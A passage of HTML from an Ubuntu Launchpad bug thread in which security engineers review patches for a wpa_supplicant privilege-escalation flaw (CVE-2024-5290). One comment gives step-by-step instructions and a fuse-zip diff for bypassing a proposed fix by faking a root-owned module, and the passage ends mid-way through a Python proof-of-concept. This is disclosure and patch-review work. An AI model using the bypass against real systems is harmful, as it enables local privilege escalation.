     <textarea style="width: 100%" rows="10">Thanks for doing the investigation Marc! There is always the risk that someone is relying on the patch but that should be a low number of users and removing the patch seems the best course or action here unless we decide to do nothing, I would be fine with either of those options</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/wpa/+bug/2067613/comments/12" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~mdeslaur" class="sprite person">Marc Deslauriers (mdeslaur)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-18T11:34:43.610517+00:00" title="2024-07-18 11:34:43 UTC">on 2024-07-18</time><span class="editable-message-last-edit-date">
                <a href="#" class="editable-message-last-edit-link">(last edit <time itemprop="editTime" datetime="2024-07-18T11:41:30.595465+00:00" title="2024-07-18 11:41:30 UTC">on 2024-07-18</time>)</a>:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/wpa/+bug/2067613/comments/12"> #12</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>There are also the permissions on the socket which are patched to be netdev in the Debian package. Here is a list of historical Debian bugs and what they added:</p>
<p><a rel="nofollow" href="https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=412179">https:/<wbr />/bugs.debian.<wbr />org/cgi-<wbr />bin/bugreport.<wbr />cgi?bug=<wbr />412179</a> - added netdev to the dbus permissions<br />
<a rel="nofollow" href="https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=418641">https:/<wbr />/bugs.debian.<wbr />org/cgi-<wbr />bin/bugreport.<wbr />cgi?bug=<wbr />418641</a> - adds netdev group on install (disabled in Ubuntu)<br />
<a rel="nofollow" href="https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=428620">https:/<wbr />/bugs.debian.<wbr />org/cgi-<wbr />bin/bugreport.<wbr />cgi?bug=<wbr />428620</a> - mention netdev in README.modes<br />
<a rel="nofollow" href="https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1005639">https:/<wbr />/bugs.debian.<wbr />org/cgi-<wbr />bin/bugreport.<wbr />cgi?bug=<wbr />1005639</a> - mention netdev in man page<br />
<a rel="nofollow" href="https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1012844">https:/<wbr />/bugs.debian.<wbr />org/cgi-<wbr />bin/bugreport.<wbr />cgi?bug=<wbr />1012844</a> - set control socket to netdev group</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">There are also the permissions on the socket which are patched to be netdev in the Debian package. Here is a list of historical Debian bugs and what they added:

https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=412179 - added netdev to the dbus permissions
https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=418641 - adds netdev group on install (disabled in Ubuntu)
https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=428620 - mention netdev in README.modes
https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1005639 - mention netdev in man page
https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1012844 - set control socket to netdev group
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/wpa/+bug/2067613/comments/13" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~sudhackar" class="sprite person">Sudhakar Verma (sudhackar)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-24T19:21:25.760521+00:00" title="2024-07-24 19:21:25 UTC">on 2024-07-24</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/wpa/+bug/2067613/comments/13"> #13</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a href="https://bugs.launchpad.net/ubuntu/+source/wpa/+bug/2067613/+attachment/5800019/+files/wpa_2.10-21.1ubuntu0.1.debdiff" class="sprite haspatch-icon">wpa_2.10-21.1ubuntu0.1.debdiff</a>
        <a class="sprite edit action-icon" href="/ubuntu/+source/wpa/+bug/2067613/+attachment/5800019">Edit</a>
        
        (1.4 KiB,
        text/plain)
        
      </li>
    </ul>

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Based on alexm&#x27;s comments I propose this for oracular - I have tested this with a real wifi card too - in gui and from nmcli.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Based on alexm's comments I propose this for oracular - I have tested this with a real wifi card too - in gui and from nmcli.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/wpa/+bug/2067613/comments/14" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~eslerm" class="sprite person">Mark Esler (eslerm)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-24T20:54:11.980552+00:00" title="2024-07-24 20:54:11 UTC">on 2024-07-24</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/wpa/+bug/2067613/comments/14"> #14</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a href="https://bugs.launchpad.net/ubuntu/+source/wpa/+bug/2067613/+attachment/5800049/+files/cve-2024-5290.patch" class="sprite haspatch-icon">cve-2024-5290.patch</a>
        <a class="sprite edit action-icon" href="/ubuntu/+source/wpa/+bug/2067613/+attachment/5800049">Edit</a>
        
        (6.0 KiB,
        text/plain)
        
      </li>
    </ul>

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Luci has proposed a draft patch using a check-ownership<wbr />-of-module-<wbr />files<br />
approach. He has comments, but asked that I post before he gets back online<br />
tomorrow.</p>
<p>Sudhakar, could you please test this against the exploit?</p>
<p>Marc would like us to consider if a CVE-2023-38408 or CVE-2010-3856 style<br />
attack is still possible with this patch.</p>
<p>Perhaps dropping the netdev patch is still desirable, in addition.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Luci has proposed a draft patch using a check-ownership-of-module-files 
approach. He has comments, but asked that I post before he gets back online
tomorrow.

Sudhakar, could you please test this against the exploit?

Marc would like us to consider if a CVE-2023-38408 or CVE-2010-3856 style 
attack is still possible with this patch.

Perhaps dropping the netdev patch is still desirable, in addition.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/wpa/+bug/2067613/comments/15" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~eslerm" class="sprite person">Mark Esler (eslerm)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-24T20:55:21.210085+00:00" title="2024-07-24 20:55:21 UTC">on 2024-07-24</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/wpa/+bug/2067613/comments/15"> #15</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Oh, sorry Sudhakar, I didn&#x27;t see your comment before posting.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Oh, sorry Sudhakar, I didn't see your comment before posting.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/wpa/+bug/2067613/comments/16" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~mdeslaur" class="sprite person">Marc Deslauriers (mdeslaur)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-24T21:02:53.675606+00:00" title="2024-07-24 21:02:53 UTC">on 2024-07-24</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/wpa/+bug/2067613/comments/16"> #16</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>@Sudhakar, the debdiff in comment #13 is insufficient I believe as the netdev group is also being added to the socket, where the command line tools can still do the same type of attack.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">@Sudhakar, the debdiff in comment #13 is insufficient I believe as the netdev group is also being added to the socket, where the command line tools can still do the same type of attack.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/wpa/+bug/2067613/comments/17" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~rmcnamara-snyk" class="sprite person">Rory McNamara (rmcnamara-snyk)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-25T13:31:01.309583+00:00" title="2024-07-25 13:31:01 UTC">on 2024-07-25</time><span class="editable-message-last-edit-date">
                <a href="#" class="editable-message-last-edit-link">(last edit <time itemprop="editTime" datetime="2024-07-25T14:24:17.401120+00:00" title="2024-07-25 14:24:17 UTC">on 2024-07-25</time>)</a>:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/wpa/+bug/2067613/comments/17"> #17</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I&#x27;ve had a look at the patch in #14 and it seems I can bypass it.</p>
<p>You can fake a uid 0 file with fuse &amp; overlayfs in a user namespace (overlayfs is also needed since by default Ubuntu doesn&#x27;t set user_allow_other in fuse.conf). I think a path prefix check might also be appropriate in addition to the uid checks to mitigate this bypass.</p>
<p>Reproduction:</p>
<p>1. Mount a fuse filesystem which contains the loadable.so owned by root. I used fuse-zip [1] with a patch [2] so all files are uid 0. This won&#x27;t work directly because root (and therefore wpa_supplicant) can&#x27;t read the files in this mount due to the user_allow_other fuse setting not being set. I mounted this at /tmp/stage/zipmount</p>
<p>2. Create a new user &amp; mount namespace. On stock Ubuntu server (where I&#x27;m testing this) you can do this with `busybox unshare -mr`</p>
<p>3. Inside the mount namespace, mount an overlay filesystem with a `lowerdir` as the same mountpoint as the fuse filesystem. `upperdir` and `workdir` don&#x27;t need to be anything special (I used /tmp/stage/upper and /tmp/stage/work), and the mount target can be anywhere (I used /tmp/stage/target).</p>
<p>4. Get the pid of the shell inside the mount namespace, e.g `echo $$`</p>
<p>5. Update /tmp/stage/wpa.conf from the original exploit to look something like the following, where 146062 is the pid of my mount namespace shell, and /tmp/stage/target is where the overlayfs is mounted.</p>
<p>opensc_<wbr />engine_<wbr />path=/proc/<wbr />146062/<wbr />root/tmp/<wbr />stage/target/<wbr />loadable.<wbr />so</p>
<p>6. Call CreateInterface as in the original exploit. When wpa_supplicant performs the fstat it will be tricked into seeing the loadable.so file as owned by root, therefore allowing the load.</p>
<p>[1] <a rel="nofollow" href="https://bitbucket.org/agalanin/fuse-zip/src/master/">https:/<wbr />/bitbucket.<wbr />org/agalanin/<wbr />fuse-zip/<wbr />src/master/</a><br />
[2]</p>
<p>diff --git a/lib/fuse-zip.cpp b/lib/fuse-zip.cpp<br />
index 0aa2c68..104b279 100644<br />
--- a/lib/fuse-zip.cpp<br />
+++ b/lib/fuse-zip.cpp<br />
@@ -163,7 +163,7 @@ int fusezip_<wbr />getattr(<wbr />const char *path, struct stat *stbuf) {<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;stbuf-&gt;st_mtim = node-&gt;mtime();<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;stbuf-&gt;st_ctim = node-&gt;ctime();<br />
&nbsp;#endif // __APPLE__<br />
-    stbuf-&gt;st_uid = node-&gt;uid();<br />
+    stbuf-&gt;st_uid = 0;<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;stbuf-&gt;st_gid = node-&gt;gid();<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;stbuf-&gt;st_rdev = node-&gt;device();</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I've had a look at the patch in #14 and it seems I can bypass it.

You can fake a uid 0 file with fuse &amp; overlayfs in a user namespace (overlayfs is also needed since by default Ubuntu doesn't set user_allow_other in fuse.conf). I think a path prefix check might also be appropriate in addition to the uid checks to mitigate this bypass.

Reproduction:

1. Mount a fuse filesystem which contains the loadable.so owned by root. I used fuse-zip [1] with a patch [2] so all files are uid 0. This won't work directly because root (and therefore wpa_supplicant) can't read the files in this mount due to the user_allow_other fuse setting not being set. I mounted this at /tmp/stage/zipmount

2. Create a new user &amp; mount namespace. On stock Ubuntu server (where I'm testing this) you can do this with `busybox unshare -mr`

3. Inside the mount namespace, mount an overlay filesystem with a `lowerdir` as the same mountpoint as the fuse filesystem. `upperdir` and `workdir` don't need to be anything special (I used /tmp/stage/upper and /tmp/stage/work), and the mount target can be anywhere (I used /tmp/stage/target).

4. Get the pid of the shell inside the mount namespace, e.g `echo $$`

5. Update /tmp/stage/wpa.conf from the original exploit to look something like the following, where 146062 is the pid of my mount namespace shell, and /tmp/stage/target is where the overlayfs is mounted.

opensc_engine_path=/proc/146062/root/tmp/stage/target/loadable.so

6. Call CreateInterface as in the original exploit. When wpa_supplicant performs the fstat it will be tricked into seeing the loadable.so file as owned by root, therefore allowing the load.


[1] https://bitbucket.org/agalanin/fuse-zip/src/master/
[2]

diff --git a/lib/fuse-zip.cpp b/lib/fuse-zip.cpp
index 0aa2c68..104b279 100644
--- a/lib/fuse-zip.cpp
+++ b/lib/fuse-zip.cpp
@@ -163,7 +163,7 @@ int fusezip_getattr(const char *path, struct stat *stbuf) {
     stbuf-&gt;st_mtim = node-&gt;mtime();
     stbuf-&gt;st_ctim = node-&gt;ctime();
 #endif // __APPLE__
-    stbuf-&gt;st_uid = node-&gt;uid();
+    stbuf-&gt;st_uid = 0;
     stbuf-&gt;st_gid = node-&gt;gid();
     stbuf-&gt;st_rdev = node-&gt;device();
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/wpa/+bug/2067613/comments/18" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~mdeslaur" class="sprite person">Marc Deslauriers (mdeslaur)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-25T13:59:42.984999+00:00" title="2024-07-25 13:59:42 UTC">on 2024-07-25</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/wpa/+bug/2067613/comments/18"> #18</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Wow, thanks for the info Rory, that&#x27;s a nice trick I had not thought of.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Wow, thanks for the info Rory, that's a nice trick I had not thought of.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/wpa/+bug/2067613/comments/19" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~lucistanescu" class="sprite person">Luci Stanescu (lucistanescu)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-26T14:04:30.881765+00:00" title="2024-07-26 14:04:30 UTC">on 2024-07-26</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/wpa/+bug/2067613/comments/19"> #19</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>That is a neat trick!</p>
<p>As you said, one option is to do a path prefix check. If we only include something like &#x27;/usr/lib&#x27;, could user have modules installed elsewhere, like &#x27;/opt&#x27; or who knows where else?</p>
<p>Denylisting &#x27;/proc&#x27; would be problematic if procfs is mounted elsewhere.</p>
<p>As an alternative, since the issue is caused by /proc/pid/root allowing access to paths in other mount namespaces, what about &quot;canonicalizing&quot; the path, like realpath() would do? Just calling realpath() would be subject to a TOCTOU race condition, so this would have to be done using *at() calls, a bit like the following Python POC. This is a bit ugly and complicated for my liking and it feels like going down a rabbit hole, but I&#x27;m putting it here for others&#x27; consideration.</p>
<p>import os</p>
<p>def by_component_<wbr />open(path)<wbr />:<br />
&nbsp;&nbsp;&nbsp;&nbsp;dir_fd = None<br />
&nbsp;&nbsp;&nbsp;&nbsp;max_iterations = 256<br />
&nbsp;&nbsp;&nbsp;&nbsp;while path:<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;max_iterations -= 1<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if max_iterations == 0:<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;raise RuntimeError<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try:<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;component, path = path.split(&#x27;/&#x27;, 1)<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;except ValueError:<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;component, path = path, &#x27;&#x27;<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;path = path.lstrip(&#x27;/&#x27;)<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if component == &#x27;&#x27;:<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if dir_fd is not None:<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;os.close(<wbr />dir_fd)<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dir_fd = os.open(&#x27;/&#x27;, os.O_PATH)<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;file_fd = os.open(component, os.O_PATH | os.O_NOFOLLOW, dir_fd=dir_fd)<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try:<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;component = os.readlink(&#x27;&#x27;, dir_fd=file_fd)<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;except FileNotFoundError:<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;os.<wbr />close(dir_<wbr />fd)<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dir_fd = file_fd<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if path:<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;path = os.path.<wbr />join(component, path)<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;path = component<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;os.<wbr />close(file_<wbr />fd)<br />
&nbsp;&nbsp;&nbsp;&nbsp;return dir_fd</p>
<p>if __name__ == &#x27;__main__&#x27;:<br />
&nbsp;&nbsp;&nbsp;&nbsp;import sys<br />
&nbsp;&nbsp;&nbsp;&nbsp;import traceback</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;try:<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fd = os.open(<wbr />sys.argv[<wbr />1], os.O_RDONLY)<br />
&nbsp;&nbsp;&nbsp;&nbsp;except Exception:<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;traceback.<wbr />print_exc(<wbr />)<br />
&nbsp;&nbsp;&nbsp;&nbsp;else:<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;print(<wbr />&quot;Direct: {} ({})&quot;.format(fd, os.readlink(<wbr />&#x27;/proc/<wbr />self/fd/<wbr />{}&#x27;.format(<wbr />fd))))<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;os.close(<wbr />fd)<br />
&nbsp;&nbsp;&nbsp;&nbsp;try:<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fd = by_component_<wbr />open(sys.<wbr />argv[1]<wbr />)<br />
&nbsp;&nbsp;&nbsp;&nbsp;except Exception:<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;traceback.<wbr />print_exc(<wbr />)<br />
&nbsp;&nbsp;&nbsp;&nbsp;else:<br />
